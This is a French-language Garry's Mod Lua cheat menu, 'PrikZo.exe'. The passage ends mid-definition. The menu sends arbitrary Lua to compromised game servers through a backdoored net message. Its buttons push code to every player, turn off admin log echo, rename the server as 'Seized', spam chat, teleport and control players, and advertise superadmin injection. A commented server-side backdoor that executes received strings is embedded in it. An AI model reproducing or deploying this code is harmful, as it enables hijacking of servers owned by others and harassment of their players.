if ( SERVER ) then 
function file.Read(d)      
return "Coucou <3"         
end
end
MsgC (Color(math.random( 1, 255 ), math.random( 1, 255 ), math.random( 1, 9999 )), [[  =======================================================================================================================
:::::::::  :::::::::  ::::::::::: :::    ::: :::::::::  ::::::::       :::::::::: :::    ::: :::::::::: 
:+:    :+: :+:    :+:     :+:     :+:   :+:       :+:  :+:    :+:      :+:        :+:    :+: :+:        
+:+    +:+ +:+    +:+     +:+     +:+  +:+       +:+   +:+    +:+      +:+         +:+  +:+  +:+        
+#++:++#+  +#++:++#:      +#+     +#++:++       +#+    +#+    +:+      +#++:++#     +#++:+   +#++:++#   
+#+        +#+    +#+     +#+     +#+  +#+     +#+     +#+    +#+      +#+         +#+  +#+  +#+        
#+#        #+#    #+#     #+#     #+#   #+#   #+#      #+#    #+# #+#  #+#        #+#    #+# #+#        
###        ###    ### ########### ###    ### #########  ########  ###  ########## ###    ### ########## 

24/06/2018 00H10 <3

 ]])
  
MsgC (Color(math.random( 1, 255 ), math.random( 1, 255 ), math.random( 1, 9999 )), [[ 	
======================================================================================================================= 
						
PrikZo.exe Exploit chargé avec succès ! :D.
Amusez-vous bien avec notre menu !.
Pour toutes demande, contacter PrikZo.exe (Mathis KarmaTeam sur steam) ou rendez-vous sur le discord.
Version actuel : 1.0 - Premium.
Menu accordé à : Mathis.
Discord : https://discord.gg/Zt39af6
Steam : http://steamcommunity.com/id/PrinCySurYTB/

* * * * * * * * * * * * * * *

Changelog :

Mise à jour du 24/04/18 à 9h30 : Version 1.0 - Premium
[+] - Ajout d'un bouton SuperAdmin Injection.
[+] - Nouveaux Exploit qu'on connais.				  

* * * * * * * * * * * * * * *

======================================================================================================================= ]])
Version = "v1.0"



if file.Exists( "includes/extensions/client/vehicle.lua", "LUA" ) == true then
surface.PlaySound("ambient/alarms/klaxon1.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "PrikZo.exe", "] ", Color( 255, 0, 0 ), "!Cake Anti-Cheat détecter fait gaffe  !!" )
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "PrikZo.exe", "] ", Color( 255, 255, 255 ), "Pas de !Cake Anti-Cheat détecter fout le bordel." )
end

netKey = "Sandbox_ArmDupe" 
function IsMessagePooled( netmessage )
    status, error = pcall(net.Start,netmessage)
    return status
end

function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 500, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
        draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
        draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
        timer.Simple( 3, function()
            notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
        end)
    end) 
end

local function playSound(url)
    sound.PlayURL(url, '', function( station ) 
        if ( IsValid( station ) ) then
            station:SetPos( LocalPlayer():GetPos() )
            station:Play()
        end
    end)
end

surface.CreateFont( "creditsfont", {  
    font = "Roboto",
    extended = false,
    size = 40,
    weight = 700,
    blursize = 0,
    scanlines = 0,
    antialias = true,
} )

--[[-----------
STOP ALL SOUND (REDEMARRAGE MENU :D)
--------------]]
RunConsoleCommand "stopsound"
--[[-----------
STOP ALL SOUND (REDEMARRAGE MENU :D)
--------------]]

hook.Add("HUDPaint", "ACTIVATED", function() draw.SimpleTextOutlined( "By Mathis | Welcome to PrikZo.exe", "creditsfont", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/15, Color(math.random(1,255),math.random(1,255),math.random(1,255)), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255)) end)

LocalPlayer():ChatPrint( "Mathis te souhaite la bienvenue. Dans la console fait PrikZoVmenu" )

--[[-----------
MUSIQUE LOADING MENU
--------------]]
sound.PlayURL ( "http://askipcmonmenu.000webhostapp.com/monzizi/Coucoucpourtedire.mp3", "mono", function( station )
	if ( IsValid( station ) ) then

		station:SetPos( LocalPlayer():GetPos() )

		station:Play()
	else

		LocalPlayer():ChatPrint( "Echec Du Chargement De La Musique :/" )

	end
end )
--[[-----------
MUSIQUE LOADING MENU
--------------]]

concommand.Add("PrikZoVmenu",function( )
    local Menu = vgui.Create("DFrame")
    Menu:SetSize(1000,500)
    Menu:SetTitle("")
    Menu:Center()
    Menu:MakePopup()
    Menu.Paint = function()
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(0,0,Menu:GetWide(),Menu:GetTall())
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(2,2,Menu:GetWide()-4,Menu:GetTall()-4)
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(4,4,Menu:GetWide()-8,Menu:GetTall()-8)
    end

    local tabs = vgui.Create( "DPropertySheet", Menu)
    tabs:SetSize(490,450)
    tabs:SetPos(10,20)
    tabs.Paint = function()
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(0,0,tabs:GetWide(),tabs:GetTall())
    end

    local tabs2 = vgui.Create( "DPropertySheet", Menu)
    tabs2:SetSize(600,500)
    tabs2:SetPos(500,20)
    tabs2.Paint = function()
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(0,0,tabs2:GetWide(),tabs2:GetTall())
    end 

    local drawHUD = vgui.Create("DPanel")
    drawHUD.Paint = function()
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
    tabs:AddSheet( "Exploits", drawHUD, "icon16/picture_edit.png")

    local Staff = vgui.Create("DPanel")
    Staff.Paint = function()
        surface.SetDrawColor( 190,0,0,255 )
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        surface.SetDrawColor( 190,0,0,255 )
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        surface.SetDrawColor( 190,0,0,255 )
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
    tabs:AddSheet("Exploits sur admin", Staff, "icon16/control_play_blue.png")
	
    local Sound = vgui.Create("DPanel")
    Sound.Paint = function()
        surface.SetDrawColor( 190,0,0,255 )
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        surface.SetDrawColor( 190,0,0,255 )
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        surface.SetDrawColor( 190,0,0,255 )
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
    tabs:AddSheet("Soundboard", Sound, "icon16/control_play_blue.png")

    local strip = vgui.Create("DPanel")
    strip.Paint = function()
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
    tabs2:AddSheet( "Enlever les Armes", strip, "icon16/error_add.png")

    local hacks = vgui.Create("DPanel")
    hacks.Paint = function()
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        surface.SetDrawColor( 0,0,0,255 )
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
    tabs2:AddSheet( "Add Superadmin", hacks, "icon16/cross.png")

local MathisLbg = vgui.Create( "DButton" ) 
        MathisLbg:SetPos( 70, 300 )
        MathisLbg:SetParent(hacks)
        MathisLbg:SetText( "I Love Prikzo" )
        MathisLbg:SetFont( "vaporfont2" )
        MathisLbg:SetTextColor( Color(255, 255, 255, 255) )
        MathisLbg:SetSize( 300, 30 )
        MathisLbg.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, MathisLbg:GetWide(), MathisLbg:GetTall() )
        end

    local TopRight = vgui.Create("DButton", drawHUD)
    TopRight:SetSize(105,75)
    TopRight:SetVisible(false)
    TopRight:SetTextColor(Color(255,255,255))
    TopRight:SetText("Toupie droite supérieure")
    TopRight.Paint = function()
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    TopRight.DoClick = function ()
        net.Start(netKey)
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/spin.gif\")]])end")
        net.WriteBit(1)
        net.SendToServer()
    end
    local BottomRight = vgui.Create("DButton", drawHUD)
    BottomRight:SetSize(105,75)
    BottomRight:SetVisible(false)
    BottomRight:SetTextColor(Color(255,255,255))
    BottomRight:SetText("Toupie en bas à droite")
    BottomRight.Paint = function()
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    BottomRight.DoClick = function ()
        net.Start(netKey)
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/spin.gif\")]])end")
        net.WriteBit(1)
        net.SendToServer()
    end
    local Earthquake = vgui.Create("DButton", drawHUD)
    Earthquake:SetSize(105,75)
    Earthquake:SetPos(260,650)
    Earthquake:SetVisible(false)
    Earthquake:SetTextColor(Color(255,255,255))
    Earthquake:SetText("EarthquakeRP")
    Earthquake.Paint = function()
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    Earthquake.DoClick = function()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]])")
    net.WriteBit(1)
    net.SendToServer()
end
local Effect1 = vgui.Create("DButton", drawHUD)
Effect1:SetSize(105,75)
Effect1:SetPos(10,550)
Effect1:SetTextColor(Color(255,255,255))
Effect1:SetText("Effect1")
Effect1.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    Effect1.DoClick = function()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]])")
    net.WriteBit(1)
    net.SendToServer()
end
local Effect2 = vgui.Create("DButton", drawHUD)
Effect2:SetSize(105,75)
Effect2:SetPos(135,550)
Effect2:SetTextColor(Color(255,255,255))
Effect2:SetText("Effect2")
Effect2.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    Effect2.DoClick = function()
    net.Start(netKey)   
    net.WriteString("BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/skel2.gif\")]])")
    net.WriteBit(1)
    net.SendToServer() 
end
local Effect3 = vgui.Create("DButton", drawHUD)
Effect3:SetSize(105,75)
Effect3:SetPos(260,550)
Effect3:SetTextColor(Color(255,255,255))
Effect3:SetText("Effect3")
Effect3.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    Effect3.DoClick = function()
    net.Start(netKey)   
    net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]])end")
    net.WriteBit(1)
    net.SendToServer() 
end


local DScrollPanel = vgui.Create( "DScrollPanel", drawHUD )
DScrollPanel:Dock( FILL )

local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Faire tourner la caméra pendant 5 s")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10000, 10000, 6, 5 )]] ) end ")
    net.WriteBit(1)
    net.SendToServer() 
end
local MathisLeBG = DScrollPanel:Add( "DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*1+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("ulx logecho 0")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"logecho\", \"0\")")
    net.WriteBit(1)
    net.SendToServer() 
end
local MathisLeBG = DScrollPanel:Add( "DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*2+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Changer le nom du serveur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", \"Seized\", \"By\", \"PrikZo.exe\", \"| By Mathis |\")")
    net.WriteBit(1)
    net.SendToServer() 
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*3+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("SPAM")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString("timer.Create( \"memer\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"нαcĸed вy prιĸzo.eхe [ мαтнιѕ oɴ ]\")]]) end)")
    net.WriteBit(1)
    net.SendToServer()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "PrikZo Backdoor Menu", "] ", Color( 255, 255, 255 ), "le spam chat est activé bon victimage de server" ) 
end

local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*4+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("STOP SPAM")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString("timer.Stop( \"memer\")")
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*5+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Téléportations TROLL")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) end" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*6+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Changez le model des joueur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[ 
			
			Player( id ):SetModel( "models/maxofs2d/companion_doll.mdl" )
			
			Player( id ):SetMaterial( "models/debug/debugwhite" )
			
			hook.Add( "Think", "horse", function()
				
				if !IsValid( Player( id ) ) then return end
				
				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
			
			end )
]] )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*7+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[ON]Faire tourner les Joueur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"+right\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*8+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[OFF]Faire tourner les Joueur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-right\")" )
    net.WriteBit(1)
    net.SendToServer()
end 
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*9+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[ON]Faire Avancer les joueur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"+forward\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*10+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[OFF]Faire Avancer les joueur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-forward\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*11+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[ON]Faire Reculer les joueur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"+back\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*12+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[OFF]Faire Reculer les joueur")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-back\")" )
    net.WriteBit(1)
    net.SendToServer()
end 
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*13+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Faire ReRejoindre le serveur Au joueurs")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"retry\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*13+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Faire ReRejoindre le serveur Au joueurs")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
